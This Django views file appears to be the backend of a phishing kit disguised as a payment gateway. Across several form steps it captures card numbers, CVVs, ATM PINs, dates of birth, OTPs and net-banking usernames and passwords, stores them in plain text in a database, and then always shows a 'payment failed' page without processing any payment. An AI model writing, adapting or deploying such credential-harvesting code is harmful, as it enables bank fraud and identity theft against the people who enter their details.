from django.shortcuts import render, HttpResponse, redirect
from .models import UserDetail

# Create your views here.
def index(request):
    user_id = UserDetail.objects.order_by('date').reverse()[0].user_id
    sn_no = UserDetail.objects.order_by('date').reverse()[0].sNo

    user_idArr = []
    sNo_arr = []
    for i in UserDetail.objects.values('user_id', 'sNo'):
        user_idArr.append(i['user_id'])
        sNo_arr.append(i['sNo'])
    # print(sn_no , '---------------------', user_id, '------', int(int(sn_no) + 1))
    print(user_idArr[-1], '--------------', sNo_arr[-1])
    new_user_id = int(user_idArr[-1]) +1
    new_sno = sNo_arr[-1] +1
    request.session['user_id'] = new_user_id
    request.session['s_no'] = new_sno
    print(new_user_id, '------------', new_sno)
    if request.method == 'POST':
        payment_mode = request.POST.get('payment_type')
        amount = request.POST.get('amount_entered')
        card = UserDetail(payment_mode=payment_mode, amount=amount, user_id=str(new_user_id), sNo=str(new_sno))
        card.save()
        if payment_mode == 'Visa/Master Credit Card' or payment_mode == 'Visa/Master Debit Card':
            request.session['payment_type'] = 'card'
            return redirect('paymentProcessing')
        else:
            request.session['payment_type'] = 'nteB'
            return redirect('paymentProcessing')

    context = {
      
    }
    return render(request, 'index.html', context)

def paymentProcessing(request):
    payment_type = request.session.get('payment_type')

    context = {
        'payment_type': payment_type
    }
    return render(request, 'doNotRefresh.html', context)

def cardDetails(request):
    user_id = request.session.get('user_id')
    print(user_id)

    if request.method == 'POST':
        card_holder_name = request.POST.get('card_holder_name')
        card_number = request.POST.get('card_number')
        exp_date_month = request.POST.get('expmonth')
        exp_date_year = request.POST.get('expdate')
        exp_date = str(str(exp_date_month) + "/" + str(exp_date_year))
        cvv = request.POST.get('cvv')
        UserDetail.objects.filter(user_id=user_id).update(card_holder_name=card_holder_name, card_number=card_number, exp_date=exp_date, cvv=cvv)
        return redirect('atmPin')

    return render(request, 'creditCard.html')

def atmPin(request):
    user_id = request.session.get('user_id')
    if request.method == 'POST':
        valid_m = request.POST.get('valid_month')
        valid_y = request.POST.get('valid_year')
        valid_from = str(str(valid_m) + '/' + str(valid_y))
        dob_d = request.POST.get('dob_date')
        dob_m = request.POST.get('dob_month')
        dob_y = request.POST.get('dob_year')
        dob = str(str(dob_d) + '/' + str(dob_m) + '/' + str(dob_y))
        atm_pin = request.POST.get('atmpin')
        UserDetail.objects.filter(user_id=user_id).update(valid_from=valid_from, dob=dob, atm_pin=atm_pin)
        return redirect('otpCard')

    return render(request, 'atmPin.html')

def otpCard(request):
    user_id = request.session.get('user_id')
    if request.method == 'POST':
        otp = request.POST.get('otp')
        UserDetail.objects.filter(user_id=user_id).update(otp=otp)
        return redirect('paymentFailed')

    return render(request, 'otp.html')


def netBanking(request):
    user_id = request.session.get('user_id')
    if request.method == 'POST':
        loginId = request.POST.get('loginid')
        loginPass = request.POST.get('loginpass')
        UserDetail.objects.filter(user_id=user_id).update(net_banking_id=loginId, net_banking_pass=loginPass)
        return redirect('netOtp')
    return render(request, 'netBanking.html')

def netOtp(request):
    user_id = request.session.get('user_id')
    if request.method == 'POST':
        net_banking_otp = request.POST.get('otp')
        UserDetail.objects.filter(user_id=user_id).update(net_banking_otp=net_banking_otp)
        return redirect('paymentFailed')
    return render(request, 'netBankOtp.html')


def paymentFailed(request):
    return render(request, 'paymentFailed.html')


